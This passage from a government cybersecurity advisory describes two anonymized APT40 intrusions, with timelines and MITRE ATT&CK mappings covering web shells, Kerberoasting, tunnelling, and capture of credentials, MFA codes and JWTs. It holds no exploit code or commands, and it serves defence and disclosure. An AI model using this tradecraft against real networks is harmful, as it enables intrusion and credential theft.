<p>In mid-August, the ASD’s ACSC notified the organization of malicious interactions with their network from a likely compromised device being used by the group in late August and, with the organization’s consent, the ASD’s ACSC deployed host-based sensors to likely affected hosts on the organization’s network. These sensors allowed ASD’s ACSC incident response analysts to undertake a thorough digital forensics investigation. Using available sensor data, the ASD’s ACSC analysts successfully mapped the group’s activity and created a detailed timeline of observed events.</p>
<p>From July to August, key actor activity observed by the ASD’s ACSC included:</p>
<ul>
<li>Host enumeration, which enables an actor to build their own map of the network;</li>
<li>Web shell use, giving the actor an initial foothold on the network and a capability to execute commands; and</li>
<li>Deployment of other tooling leveraged by the actor for malicious purposes.</li>
</ul>
<p>The investigation uncovered evidence of large amounts of sensitive data being accessed and evidence that the actors moved laterally through the network [<a href=\"https://attack.mitre.org/techniques/T1021/002/\" title=\"Remote Services: SMB/Windows Admin Shares\">T1021.002</a>]. Much of the compromise was facilitated by the group’s establishment of multiple access vectors into the network, the network having a flat structure, and the use of insecure internally developed software that could be used to arbitrarily upload files. Exfiltrated data included privileged authentication credentials that enabled the group to log in, as well as network information that would allow the actors to regain unauthorized access if the original access vector was blocked. No additional malicious tooling was discovered beyond those on the initially exploited machine; however, a group’s access to legitimate and privileged credentials would negate the need for additional tooling. Findings from the investigation indicate the organization was likely deliberately targeted by APT40, as opposed to falling victim opportunistically to a publicly known vulnerability.</p>
<h2><strong>Investigation Findings</strong></h2>
<p>In mid-August 2022, the ASD’s ACSC notified the organization that a confirmed malicious IP believed to be affiliated with a state-sponsored cyber group had interacted with the organization’s computer networks between at least July and August. The compromised device probably belonged to a small business or home user.</p>
<p>In late August, the ASD’s ACSC deployed a host-based agent to hosts on the organization’s network which showed evidence of having been impacted by the compromise.</p>
<p>Some artefacts which could have supported investigation efforts were not available due to the configuration of logging or network design. Despite this, the organization’s readiness to provide all available data enabled ASD’s ACSC incident responders to conduct comprehensive analysis and to form an understanding of likely APT40 activity on the network.</p>
<p>In September, after consultation with the ASD’s ACSC, the organization decided to denylist the IP identified in the initial notification. In October, the organization commenced remediation.</p>
<h3>Details</h3>
<p>Beginning in July, actors were able to test and exploit a custom web application [<a href=\"https://attack.mitre.org/techniques/T1190/\" title=\"Exploit Public-Facing Application\">T1190</a>] running on <code>&lt;webapp&gt;2-ext</code>, which enables the group to establish a foothold in the network demilitarized zone (DMZ). This was leveraged to enumerate both the network as well as all visible domains. Compromised credentials [<a href=\"https://attack.mitre.org/techniques/T1078/002/\" title=\"Valid Accounts: Domain Accounts\">T1078.002</a>] were used to query the Active Directory [<a href=\"https://attack.mitre.org/techniques/T1018/\" title=\"Remote System Discovery\">T1018</a>] and exfiltrate data by mounting file shares [<a href=\"https://attack.mitre.org/techniques/T1039/\" title=\"Data from Network Shared Drive\">T1039</a>] from multiple machines within the DMZ. The actor carried out a Kerberoasting attack in order to obtain valid network credentials from a server [<a href=\"https://attack.mitre.org/techniques/T1558/003/\" title=\"Steal or Forge Kerberos Tickets: Kerberoasting\">T1558.003</a>]. The group were not observed gaining any additional points of presence in either the DMZ or the internal network.</p>
<h3>Visual Timeline</h3>
<p>The below timeline provides a broad overview of the key phases of malicious actor activity observed on the organization’s network.</p>
  
  
  
  
<figure class=\"c-figure c-figure--large c-figure--image\" role=\"group\">
  
  <div class=\"c-figure__media\">  <img loading=\"lazy\" src=\"/sites/default/files/styles/large/public/2024-07/AA24-190A-apt40-advisory-visual-timeline-figure2.png?itok=lfBPL26D\" width=\"1024\" height=\"550\" alt=\"Figure 2: APT40 Advisory Visual Timeline\">


</div>
  </figure>
<h3>Detailed Timeline</h3>
<p><strong>July:</strong> The actors established an initial connection to the front page of a custom web application [<a href=\"https://attack.mitre.org/techniques/T1190/\" title=\"Exploit Public-Facing Application\">T1190</a>] built for the organization (hereafter referred to as the “web application” or “<code><em>webapp</em></code>”) via a transport layer security (TLS) connection [<a href=\"https://attack.mitre.org/techniques/T1102/\" title=\"Web Service\">T1102</a>]. No other noteworthy activity was observed.</p>
<p><strong>July:</strong> The actors begin enumerating the web application’s website looking for endpoints[2] to further investigate.</p>
<p><strong>July:</strong> The actors concentrate on attempts to exploit a specific endpoint.</p>
<p><strong>July:</strong> The actors are able to successfully&nbsp;POST&nbsp;to the web server, probably via a web shell placed on another page. A second IP, likely employed by the same actors, also begins posting to the same URL. The actors created and tested a number of likely web shells.&nbsp;</p>
<p>The exact method of exploitation is unknown, but it is clear that the specific endpoint was targeted to create files on&nbsp;<code><em>&lt;webapp&gt;2</em>-ext</code>.</p>
<p>ASD's ACSC believes that the two IP address connections were part of the same intrusion due to their shared interest and initial connections occurring minutes apart.</p>
<p><strong>July:</strong> The group continue to conduct host enumeration, looking for privilege escalation opportunities, and deploying a different web shell. The actors log into the web application using compromised credentials for&nbsp;<code><em>&lt;firstname.surname&gt;</em>@<em>&lt;organisation domain&gt;</em></code>.</p>
<p>The actors’ activity does not appear to have successfully achieved privilege escalation on&nbsp;<code><em>&lt;webapp&gt;2</em>-ext</code>. Instead, the actors pivoted to network-based activity.</p>
<p><strong>July:</strong>&nbsp;The actor tests the compromised credentials for a service account[3] which it likely found hardcoded in internally accessible binaries.</p>
<p><strong>July:</strong> The actors deploy the open-source tool Secure Socket Funnelling, which was used to connect out to the malicious infrastructure. This connection is employed to tunnel traffic from the actor's attack machines into the organization’s internal networks, whose machine names are exposed in event logs as they attempt to use the credentials for the service account.</p>
<p><strong>August:</strong> The actors are seen conducting a limited amount of activity, including failing to establish connections involving the service account.</p>
<p><strong>August:</strong> The actors perform significant network and Active Directory enumeration. A different compromised account is subsequently employed to mount shares[4] on Windows machines within the DMZ, enabling successful data exfiltration.</p>
<p>This seems to be opportunistic usage of a stolen credential on mountable machines in the DMZ. Firewalls blocked the actor from targeting the internal network with similar activity.</p>
<p><strong>August – September:</strong> The SSF tool re-established a connection to a malicious IP. The group are not observed performing any additional activities until their access is blocked.</p>
<p><strong>September:</strong> The organization blocks the malicious IP by denylisting it on their firewalls.</p>
<h2><strong>Actor Tactics and Techniques</strong></h2>
<p>The MITRE ATT&amp;CK framework is a documented collection of tactics and techniques employed by threat actors in cyberspace. The framework was created by U.S. not-for-profit The MITRE Corporation and functions as a common global language around threat actor behavior.</p>
<p>The ASD’s ACSC assesses the following techniques and tactics to be relevant to the actor’s malicious activity:</p>
<h3>Reconnaissance</h3>
<p><a href=\"https://attack.mitre.org/techniques/T1594/\" title=\"Search Victim-Owned Websites\">T1594</a> – Search Victim-Owned Websites</p>
<p>The actor enumerated the custom web application’s website to identify opportunities for accessing the network.</p>
<h3>Initial Access</h3>
<p><a href=\"https://attack.mitre.org/techniques/T1190\" title=\"Exploit Public-Facing Application\">T1190</a> – Exploit Public-Facing Application (regarding exploiting the custom web application)</p>
<p><a href=\"https://attack.mitre.org/techniques/T1078/002/\" title=\"Valid Accounts: Domain Accounts\">T1078.002</a> – Valid Accounts: Domain Accounts (regarding logging on with comprised credentials)</p>
<p>Exploiting internet-exposed custom web applications provided an initial point of access for the actor. The actor was later able to use credentials they had compromised to further their access to the network.</p>
<h3>Execution</h3>
<p><a href=\"https://attack.mitre.org/techniques/T1059\" title=\"Command and Scripting Interpreter\">T1059</a> – Command and Scripting Interpreter (regarding command execution through the web shell)</p>
<p><a href=\"https://attack.mitre.org/techniques/T1072/\" title=\"Software Deployment Tools\">T1072</a> – Software Deployment Tools (regarding the actor using open-source tool Secure Socket Funnelling (SSF) to connect to an IP)</p>
<h3>Persistence</h3>
<p><a href=\"https://attack.mitre.org/techniques/T1505/003\" title=\"Server Software Component: Web Shell\">T1505.003</a> – Server Software Component: Web Shell (regarding use of a web shell and SSF to establish access)</p>
<h3>Credential Access</h3>
<p><a href=\"https://attack.mitre.org/techniques/T1552/001/\" title=\"Credentials from Password Stores\">T1552.001</a> – Credentials from Password Stores (regarding password files relating to building management system [BMS])</p>
<p><a href=\"https://attack.mitre.org/techniques/T1558/003/\" title=\"Steal or Forge Kerberos Tickets: Kerberoasting\">T1558.003</a> – Steal or Forge Kerberos Tickets: Kerberoasting (regarding attack to gain network credentials)</p>
<h3>Lateral movement</h3>
<p><a href=\"https://attack.mitre.org/techniques/T1021/002/\" title=\"Remote Services: SMB Shares\">T1021.002</a> – Remote Services: SMB Shares (regarding the actor mounting SMB shares from multiple devices)</p>
<h3>Collection</h3>
<p><a href=\"https://attack.mitre.org/techniques/T1213/\" title=\"Data from Information Repositories\">T1213</a> – Data from Information Repositories (regarding manuals/documentation found on the BMS server)</p>
<h3>Exfiltration</h3>
<p><a href=\"https://attack.mitre.org/techniques/T1041/\" title=\"Exfiltration Over C2 Channel\">T1041</a> – Exfiltration Over C2 Channel (regarding the actor’s data exfiltration from Active Directory and mounting shares)</p>
<h2><strong>Case Study 2</strong></h2>
<h5>This report has been anonymized to enable wider dissemination. The impacted organization is hereafter referred to as “the organization.” Some specific details have been removed to protect the identity of the victim and incident response methods of ASD’s ACSC.</h5>
<h3>Executive Summary</h3>
<p>This report details the findings of ASD’s ACSC investigation into the successful compromise of the organization’s network in April 2022. This investigation report was provided to the organization to summarize observed malicious activity and frame remediation recommendations. The findings indicate the compromise was undertaken by APT40.</p>
<p>In May 2022, ASD’s ACSC notified an organization of suspected malicious activity impacting the organization’s network since April 2022. Subsequently, the organization informed ASD's ACSC that they had discovered malicious software on an internet‑facing server which provided the login portal for the organization’s corporate remote access solution. This server used a remote access login and identity management product and will be referred to in this report as 'the compromised appliance'. This report details the investigation findings and remediation advice developed for the organization in response to the investigation conducted by the ASD’s ACSC.</p>
<p>Evidence indicated that part of the organization’s network had been compromised by malicious cyber actor(s) via the organization’s remote access login portal since at least April 2022. This server may have been compromised by multiple actors, and was likely affected by a remote code execution (RCE) vulnerability that was widely publicized around the time of the compromise.</p>
<p>Key actor activity observed by the ASD’s ACSC included:</p>
<ul>
<li>Host enumeration, which enables an actor to build their own map of the network;</li>
<li>Exploitation of internet-facing applications and web shell use, giving the actor an initial foothold on the network and a capability to execute commands;</li>
<li>Exploitation of software vulnerabilities to escalate privileges; and</li>
<li>Credential collection to enable lateral movement.</li>
</ul>
<p>The ASD’s ACSC discovered that a malicious actor had exfiltrated several hundred unique username and password pairs on the compromised appliance in April 2022, as well as a number of multi-factor authentication codes and technical artefacts related to remote access sessions. Upon a review by the organization, the passwords were found to be legitimate. The ASD’s ACSC assesses that the actor may have collected these technical artefacts to hijack or create a remote login session as a legitimate user, and access the organization’s internal corporate network using a legitimate user account.</p>
<h3>Investigation Summary</h3>
<p>The ASD’s ACSC determined that the actor compromised appliance(s) which provide remote login sessions for organization staff and used this compromise to attempt to conduct further activity. These appliances consist of three load-balanced hosts where the earliest evidence of compromise was detected. The organization shut down two of the three load-balanced hosts shortly after the initial compromise. As a result, all subsequent activity occurred on a single host. The other servers associated with the compromised appliance were also load-balanced in a similar manner. For legibility, all compromised appliances are referred to in most of this report as a “single appliance.”</p>
<p>The actor is believed to have used publicly known vulnerabilities to deploy web shells to the compromised appliance from April 2022 onwards. Threat actors from the group are assessed to have attained escalated privileges on the appliance. The ASD’s ACSC could not determine the full extent of the activity due to lack of logging availability. However, evidence on the device indicates that an actor achieved the following:</p>
<ul>
<li>The collection of several hundred genuine username and password pairs; and</li>
<li>The collection of technical artefacts which may have allowed a malicious actor to access a virtual desktop infrastructure (VDI) session as a legitimate user.</li>
</ul>
<p>The ASD’s ACSC assesses that the actor would have sought to further the compromise of the organisation network. The artefacts exfiltrated by the actor may have allowed them to hijack or initiate virtual desktop sessions as a legitimate user, possibly as a user of their choice, including administrators. The actor may have used this access vector to further compromise organization services to achieve persistence and other goals.</p>
<p>Other organization appliances within the hosting provider managed environment did not show evidence of compromise.</p>
<h3>Access</h3>
<p>The host with the compromised appliance provided authentication via Active Directory and a webserver, for users connecting to VDI sessions [<a href=\"https://attack.mitre.org/techniques/T1021/001/\" title=\"Remote Services: Remote Desktop Protocol\">T1021.001</a>].</p>
<table>
<tbody>
<tr>
<td><strong>Location</strong></td>
<td>Compromised appliance hostnames (load-balanced)</td>
</tr>
<tr>
<td><strong>Datacentre 1</strong></td>
<td>HOST1, HOST2, HOST3</td>
</tr>
</tbody>
</table>
<p>The appliance infrastructure also included access gateway hosts that provide a tunnel to the VDI for the user, once they possess an authentication token generated and downloaded from the appliance.</p>
<p>There was no evidence of compromise of any of these hosts. However, the access gateway hosts logs showed evidence of significant interactions with known malicious IP addresses. It is likely that this reflected activity that occurred on this host, or network connections with threat actor infrastructure that reached this host. The nature of this activity could not be determined using available evidence but indicates that the group sought to move laterally in the organization’s network [<a href=\"https://attack.mitre.org/tactics/TA0008/\" title=\"Lateral Movement\">TA0008</a>].</p>
<p>Internal Hosts</p>
<p>The ASD’s ACSC investigated limited data from the internal organization’s network segment. Attempted or successful malicious activity known to have impacted the internal organization’s network segment includes actor access to VDI-related artefacts, the scraping of an internal SQL server [<a href=\"https://attack.mitre.org/techniques/T1505/001/\" title=\"Server Software Component: SQL Stored Procedures\">T1505.001</a>], and unexplained traffic observed going from known malicious IP addresses through the access gateway appliances [<a href=\"https://attack.mitre.org/tactics/TA0011/\" title=\"Command and Control\">TA0011</a>].</p>
<p>Using their access to the compromised appliance, the group collected genuine usernames, passwords [<a href=\"https://attack.mitre.org/techniques/T1003/\" title=\"OS Credential Dumping\">T1003</a>], and MFA token values [<a href=\"https://attack.mitre.org/techniques/T1111/\" title=\"Multi-Factor Authentication Interception\">T1111</a>]. The group also collected JSON Web Tokens (JWTs) [<a href=\"https://attack.mitre.org/techniques/T1528/\" title=\"Steal Application Access Token\">T1528</a>], which is an authentication artefact used to create virtual desktop login sessions. The actor may have been able to use these to create or hijack virtual desktop sessions [<a href=\"https://attack.mitre.org/techniques/T1563/002/\" title=\"Remote Service Session Hijacking: RDP Hijacking\">T1563.002</a>] and access the internal organization network segment as a legitimate user [<a href=\"https://attack.mitre.org/techniques/T1078/\" title=\"Valid Accounts\">T1078</a>].</p>
<p>The actor also used access to the compromised appliance to scrape an SQL server [<a href=\"https://attack.mitre.org/techniques/T1505/001/\" title=\"Server Software Component: SQL Stored Procedures\">T1505.001</a>], which resided in the organization’s internal network. It is likely that the actor had access to this data.</p>
<p>Evidence available from the access gateway appliance revealed that network traffic occurred through or to this device from known malicious IP addresses. As described above, this may indicate that malicious cyber actors impacted or utilized this device, potentially to pivot into the internal network.</p>
<h3>Investigation Timeline</h3>
<p>The below list provides a timeline of key activities discovered during the investigation.</p>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Time</strong></th>
<th role=\"columnheader\"><strong>Event</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>April&nbsp;2022</strong></td>
<td>Known&nbsp;malicious&nbsp;IP&nbsp;addresses&nbsp;interact&nbsp;with&nbsp;access&nbsp;gateway host&nbsp;HOST7.&nbsp;The&nbsp;nature&nbsp;of&nbsp;the interactions&nbsp;could&nbsp;not&nbsp;be&nbsp;determined.</td>
</tr>
<tr>
<td><strong>April&nbsp;2022</strong></td>
<td>
<p>All&nbsp;hosts,&nbsp;HOST1, HOST2&nbsp;and&nbsp;HOST3, were&nbsp;compromised&nbsp;by&nbsp;a&nbsp;malicious&nbsp;actor&nbsp;or&nbsp;actors, and&nbsp;web&nbsp;shells&nbsp;were&nbsp;placed&nbsp;on&nbsp;the&nbsp;hosts.</p>
<p>A&nbsp;log&nbsp;file&nbsp;was created&nbsp;or&nbsp;modified&nbsp;on HOST2.&nbsp;This&nbsp;file contains&nbsp;credential&nbsp;material&nbsp;likely captured&nbsp;by&nbsp;a&nbsp;malicious&nbsp;actor.</p>
<p>The&nbsp;/etc/security/opasswd&nbsp;and&nbsp;/etc/shadow&nbsp;files were&nbsp;modified&nbsp;on&nbsp;HOST1&nbsp;and&nbsp;HOST3, indicating&nbsp;that&nbsp;passwords&nbsp;were&nbsp;changed.&nbsp;Evidence&nbsp;available&nbsp;on&nbsp;HOST1 suggests&nbsp;that&nbsp;the password for user ‘sshuser’ was changed.</p>
</td>
</tr>
<tr>
<td><strong>April&nbsp;2022</strong></td>
<td>
<p>HOST2&nbsp;was&nbsp;shut&nbsp;down by&nbsp;the&nbsp;organization.</p>
<p>Additional&nbsp;web&nbsp;shells&nbsp;(<a href=\"https://attack.mitre.org/techniques/T1505/003\" title=\"Server Software Component: Web Shell\">T1505.003</a>)&nbsp;were&nbsp;created&nbsp;on&nbsp;HOST1&nbsp;and&nbsp;HOST3.&nbsp;HOST1experienced SSH brute force attempts from HOST3.</p>
<p>A&nbsp;log&nbsp;file&nbsp;was&nbsp;modified&nbsp;(<a href=\"https://attack.mitre.org/techniques/T1070/\" title=\"Indicator Removal\">T1070</a>)&nbsp;on&nbsp;HOST3.&nbsp;This file&nbsp;contains&nbsp;credential&nbsp;material&nbsp;(<a href=\"https://attack.mitre.org/techniques/T1078/\" title=\"Valid Accounts\">T1078</a>) likely captured by a malicious actor.</p>
<p>JWTs&nbsp;were&nbsp;captured&nbsp;(<a href=\"https://attack.mitre.org/techniques/T1528/\" title=\"Steal Application Access Token\">T1528</a>)&nbsp;and&nbsp;output&nbsp;to&nbsp;a&nbsp;file&nbsp;on&nbsp;HOST3.</p>
<p>HOST3&nbsp;was&nbsp;shut&nbsp;down&nbsp;by&nbsp;the&nbsp;organization.&nbsp;All&nbsp;activity&nbsp;after&nbsp;this&nbsp;time&nbsp;occurs&nbsp;on&nbsp;HOST1.</p>
</td>
</tr>
<tr>
<td><strong>April&nbsp;2022</strong></td>
<td>Additional&nbsp;web&nbsp;shells&nbsp;were&nbsp;created&nbsp;on&nbsp;HOST1&nbsp;(<a href=\"https://attack.mitre.org/techniques/T1505/003\" title=\"Server Software Component: Web Shell\">T1505.003</a>).&nbsp;JWTs&nbsp;were&nbsp;captured&nbsp;and&nbsp;output to&nbsp;a&nbsp;file&nbsp;on&nbsp;HOST1.</td>
</tr>
<tr>
<td><strong>April&nbsp;2022</strong></td>
<td>
<p>Additional&nbsp;web&nbsp;shells are&nbsp;created&nbsp;on&nbsp;HOST1&nbsp;(<a href=\"https://attack.mitre.org/techniques/T1505/003\" title=\"Server Software Component: Web Shell\">T1505.003</a>),&nbsp;and a&nbsp;known&nbsp;malicious&nbsp;IP&nbsp;address interacts&nbsp;with&nbsp;the&nbsp;host&nbsp;(<a href=\"https://attack.mitre.org/tactics/TA0011/\" title=\"Command and Control\">TA0011</a>).</p>
<p>A&nbsp;known&nbsp;malicious&nbsp;IP&nbsp;address&nbsp;interacts&nbsp;with&nbsp;access&nbsp;gateway&nbsp;host&nbsp;HOST7.</p>
</td>
</tr>
<tr>
<td><strong>May&nbsp;2022</strong></td>
<td>
<p>A known&nbsp;malicious&nbsp;IP&nbsp;address&nbsp;interacted&nbsp;with&nbsp;access&nbsp;gateway host&nbsp;HOST7&nbsp;(<a href=\"https://attack.mitre.org/tactics/TA0011/\">TA0011</a>).</p>
<p>An&nbsp;authentication&nbsp;event&nbsp;for&nbsp;a&nbsp;user&nbsp;is&nbsp;linked&nbsp;to&nbsp;a&nbsp;known&nbsp;malicious&nbsp;IP&nbsp;address&nbsp;in&nbsp;logs on HOST1.&nbsp;An&nbsp;additional&nbsp;web&nbsp;shell&nbsp;is&nbsp;created&nbsp;on&nbsp;this&nbsp;host&nbsp;(<a href=\"https://attack.mitre.org/techniques/T1505/003\" title=\"Server Software Component: Web Shell\">T1505.003</a>).</p>
</td>
</tr>
<tr>
<td><strong>May&nbsp;2022</strong></td>
<td>A&nbsp;script on&nbsp;HOST1&nbsp;was modified&nbsp;by&nbsp;an&nbsp;actor&nbsp;(<a href=\"https://attack.mitre.org/techniques/T1543/\" title=\"Create or Modify System Process\">T1543</a>).&nbsp;This script&nbsp;contains&nbsp;functionality which would have scraped data from an internal SQL server.</td>
</tr>
<tr>
<td><strong>May&nbsp;2022</strong></td>
<td>An&nbsp;additional&nbsp;log&nbsp;file&nbsp;on&nbsp;HOST1&nbsp;was&nbsp;last&nbsp;modified&nbsp;(<a href=\"https://attack.mitre.org/techniques/T1070/\" title=\"Indicator Removal\">T1070</a>).&nbsp;This&nbsp;file&nbsp;contains&nbsp;username&nbsp;and password&nbsp;pairs&nbsp;for the&nbsp;organization&nbsp;network,&nbsp;which&nbsp;are&nbsp;believed&nbsp;to&nbsp;be&nbsp;legitimate&nbsp;(<a href=\"https://attack.mitre.org/techniques/T1078/\" title=\"Valid Accounts\">T1078</a>).</td>
</tr>
<tr>
<td><strong>May&nbsp;2022</strong></td>
<td>An&nbsp;additional log&nbsp;file&nbsp;was&nbsp;last&nbsp;modified&nbsp;(<a href=\"https://attack.mitre.org/techniques/T1070/\" title=\"Indicator Removal\">T1070</a>).&nbsp;This&nbsp;file&nbsp;contains&nbsp;JWTs&nbsp;collected&nbsp;from HOST1.</td>
</tr>
<tr>
<td><strong>May&nbsp;2022</strong></td>
<td>Additional&nbsp;web&nbsp;shells&nbsp;were&nbsp;created&nbsp;on&nbsp;HOST1&nbsp;(<a href=\"https://attack.mitre.org/techniques/T1505/003\" title=\"Server Software Component: Web Shell\">T1505.003</a>).&nbsp;On&nbsp;this&nbsp;date, the&nbsp;organization reported&nbsp;the&nbsp;discovery&nbsp;of&nbsp;a&nbsp;web&nbsp;shell&nbsp;with&nbsp;creation&nbsp;date&nbsp;in&nbsp;April 2022&nbsp;to&nbsp;ASD’s ACSC</td>
</tr>
<tr>
<td><strong>May&nbsp;2022</strong></td>
<td>A&nbsp;number&nbsp;of&nbsp;scripts were&nbsp;created&nbsp;on HOST1,&nbsp;including&nbsp;one named&nbsp;Log4jHotPatch.jar.</td>
</tr>
<tr>
<td><strong>May&nbsp;2022</strong></td>
<td>The&nbsp;iptables-save&nbsp;command was&nbsp;used&nbsp;to&nbsp;add&nbsp;two&nbsp;open&nbsp;ports to&nbsp;the&nbsp;access gateway&nbsp;host. The&nbsp;ports&nbsp;were&nbsp;9998&nbsp;and&nbsp;9999&nbsp;(<a href=\"https://attack.mitre.org/techniques/T1572/\" title=\"Protocol Tunneling\">T1572</a>).</td>
</tr>
</tbody>
</table>
<h2><strong>Actor Tactics and Techniques</strong></h2>
<p>Highlighted below are several tactics and techniques identified during the investigation.</p>
<h3>Initial&nbsp;access</h3>
<p><a href=\"https://attack.mitre.org/techniques/T1190\" title=\"Exploit Public-Facing Application\">T1190</a>&nbsp;Exploit&nbsp;public&nbsp;facing&nbsp;application</p>
<p>The group likely exploited RCE, privilege escalation, and&nbsp;authentication&nbsp;bypass&nbsp;vulnerabilities&nbsp;in&nbsp;the&nbsp;remote&nbsp;access&nbsp;login&nbsp;and&nbsp;identity&nbsp;management&nbsp;product&nbsp;to&nbsp;gain initial access to the network.</p>
<p>This&nbsp;initial&nbsp;access&nbsp;method&nbsp;is considered&nbsp;the most&nbsp;likely&nbsp;due to the following:</p>
<ul>
<li>The&nbsp;server&nbsp;was&nbsp;vulnerable&nbsp;to&nbsp;these&nbsp;CVEs&nbsp;at&nbsp;the time;</li>
<li>Attempts&nbsp;to&nbsp;exploit&nbsp;these&nbsp;vulnerabilities&nbsp;from&nbsp;known actor infrastructure; and</li>
<li>The first known internal malicious activity occurred&nbsp;shortly&nbsp;after&nbsp;attempted&nbsp;exploitation attempts were made.</li>
</ul>
<h3>Execution</h3>
<p><a href=\"https://attack.mitre.org/techniques/T1059/004\" title=\"Command and Scripting Interpreter: Unix Shell\">T1059.004</a>&nbsp;Command&nbsp;and Scripting&nbsp;Interpreter:&nbsp;Unix Shell</p>
<p>The group successfully exploited the above vulnerabilities&nbsp;may&nbsp;have&nbsp;been&nbsp;able&nbsp;to&nbsp;run&nbsp;commands in a Unix shell available on the affected appliance.</p>
<p>Complete details of the commands run by actors cannot&nbsp;be&nbsp;provided&nbsp;as&nbsp;they&nbsp;were&nbsp;not&nbsp;logged&nbsp;by&nbsp;the appliance.</p>
<h3>Persistence</h3>
<p><a href=\"https://attack.mitre.org/techniques/T1505/003\" title=\"Server Software Component: Web Shell\">T1505.003</a>&nbsp;Server&nbsp;Software&nbsp;Component:&nbsp;Web Shell</p>
<p>Actors deployed several web shells on the affected appliance. It is possible that multiple distinct actors deployed&nbsp;web&nbsp;shells,&nbsp;but&nbsp;that&nbsp;only&nbsp;a&nbsp;smaller&nbsp;number&nbsp;of&nbsp;actors conducted activity using these web shells.</p>
<p>Web&nbsp;shells&nbsp;would&nbsp;have&nbsp;allowed&nbsp;for&nbsp;arbitrary&nbsp;command&nbsp;execution by the actor on the compromised appliances.</p>
<h3>Privilege&nbsp;escalation</h3>
<p><a href=\"https://attack.mitre.org/techniques/T1068\" title=\"Exploitation for Privilege Escalation\">T1068</a>&nbsp;Exploitation&nbsp;for Privilege&nbsp;Escalation</p>
<p>Available evidence does not describe the level of privilege attained by actors. However, using web shells, the actors would have achieved a level of privilege&nbsp;comparable&nbsp;to&nbsp;that&nbsp;of&nbsp;the&nbsp;web&nbsp;server&nbsp;on&nbsp;the&nbsp;compromised appliance. Vulnerabilities believed to have been present on the compromised appliance</p>
<p>would&nbsp;have&nbsp;allowed&nbsp;the&nbsp;actors&nbsp;to&nbsp;attain&nbsp;root&nbsp;privileges.</p>
<h3>Credential&nbsp;access</h3>
<p><a href=\"https://attack.mitre.org/techniques/T1056/003\" title=\"Input Capture: Web Portal Capture\">T1056.003</a>&nbsp;Input&nbsp;Capture:&nbsp;Web&nbsp;Portal&nbsp;Capture</p>
<p>Evidence on the compromised appliance showed that the actor had captured several hundred username-password&nbsp;pairs,&nbsp;in&nbsp;clear&nbsp;text,&nbsp;which&nbsp;are believed&nbsp;to&nbsp;be&nbsp;legitimate.&nbsp;It&nbsp;is&nbsp;likely&nbsp;that&nbsp;these&nbsp;were&nbsp;captured&nbsp;using&nbsp;some&nbsp;modification&nbsp;to&nbsp;the&nbsp;genuine authentication&nbsp;process&nbsp;which&nbsp;output&nbsp;the credentials&nbsp;to a&nbsp;file.</p>
<p><a href=\"https://attack.mitre.org/techniques/T1111\" title=\"Multi-Factor Authentication Interception\">T1111</a>&nbsp;Multi-Factor&nbsp;Authentication&nbsp;Interception The&nbsp;actor&nbsp;also&nbsp;captured&nbsp;the&nbsp;value&nbsp;of&nbsp;MFA&nbsp;tokens</p>
<p>corresponding to legitimate logins. These were likely captured by modifying the genuine authentication process to output these values to a file. There is no evidence of compromise of the “secret server’ which stores&nbsp;the&nbsp;unique&nbsp;values&nbsp;that&nbsp;provide&nbsp;for&nbsp;the&nbsp;security&nbsp;of&nbsp;MFA&nbsp;tokens.</p>
<p><a href=\"https://attack.mitre.org/techniques/T1040\" title=\"Network Sniffing\">T1040</a>&nbsp;Network&nbsp;Sniffing</p>
<p>The actor is believed to have captured JWTs by capturing HTTP traffic on the compromised appliance. There&nbsp;is&nbsp;evidence&nbsp;that&nbsp;the&nbsp;utility&nbsp;tcpdump&nbsp;was&nbsp;executed on the compromised appliance, which may have been how the actor captured these JWTs.</p>
<p><a href=\"https://attack.mitre.org/techniques/T1539\" title=\"Steal Web Session Cookie\">T1539</a>&nbsp;Steal&nbsp;Web Session&nbsp;Cookie</p>
<p>As&nbsp;described&nbsp;above,&nbsp;the&nbsp;actor&nbsp;captured&nbsp;JWTs,&nbsp;which&nbsp;are&nbsp;analogous to web session cookies. These could have been reused by the actor to establish further access.</p>
<h3>Discovery</h3>
<p><a href=\"https://attack.mitre.org/techniques/T1046\" title=\"Network Service Discovery\">T1046</a>&nbsp;Network Service&nbsp;Discovery</p>
<p>There&nbsp;is&nbsp;evidence&nbsp;that&nbsp;network&nbsp;scanning&nbsp;utility nmap was executed on the compromised appliance to&nbsp;scan other appliances in the same network segment. This was likely used by the actor to discover other reachable network services which might present opportunities for lateral movement.</p>
<h3>Collection</h3>
<p>Available evidence does not reveal how actors collected data or exactly what was collected from the&nbsp;compromised&nbsp;appliance&nbsp;or&nbsp;from&nbsp;other&nbsp;systems. However,&nbsp;it&nbsp;is&nbsp;likely&nbsp;that&nbsp;actors&nbsp;had&nbsp;access&nbsp;to&nbsp;all&nbsp;files&nbsp;on the compromised appliance, including the captured&nbsp;credentials&nbsp;[<a href=\"https://attack.mitre.org/techniques/T1003/\" title=\"OS Credential Dumping\">T1003</a>],&nbsp;MFA&nbsp;token&nbsp;values&nbsp;[<a href=\"https://attack.mitre.org/techniques/T1111/\" title=\"Multi-Factor Authentication Interception\">T1111</a>],&nbsp;and&nbsp;JWTs described above.</p>
<h3>Command&nbsp;and&nbsp;Control</h3>
<p><a href=\"https://attack.mitre.org/techniques/T1071/001\" title=\"Application Layer Protocol: Web Protocols\">T1071.001</a>&nbsp;Application&nbsp;Layer&nbsp;Protocol:&nbsp;Web&nbsp;Protocols</p>
<p>Actors&nbsp;used&nbsp;web&nbsp;shells&nbsp;for&nbsp;command&nbsp;and&nbsp;control.&nbsp;Web&nbsp;shell commands would have been passed over HTTPS&nbsp;using&nbsp;the&nbsp;existing&nbsp;web&nbsp;server&nbsp;on&nbsp;the appliance&nbsp;[<a href=\"https://attack.mitre.org/techniques/T1572/\" title=\"Protocol Tunneling\">T1572</a>].</p>
<p><a href=\"https://attack.mitre.org/versions/v15/techniques/T1001/003/\" title=\"Data Obfuscation: Protocol Impersonation\">T1001.003</a>&nbsp;Data&nbsp;Obfuscation:&nbsp;Protocol&nbsp;Impersonation</p>
<p>Actors&nbsp;used&nbsp;compromised&nbsp;devices&nbsp;as&nbsp;a&nbsp;launching&nbsp;point for&nbsp;attacks&nbsp;that&nbsp;are&nbsp;designed&nbsp;to&nbsp;blend&nbsp;in&nbsp;with&nbsp;legitimate&nbsp;traffic.</p>
<h2><strong>Detection&nbsp;and&nbsp;mitigation recommendations</strong></h2>
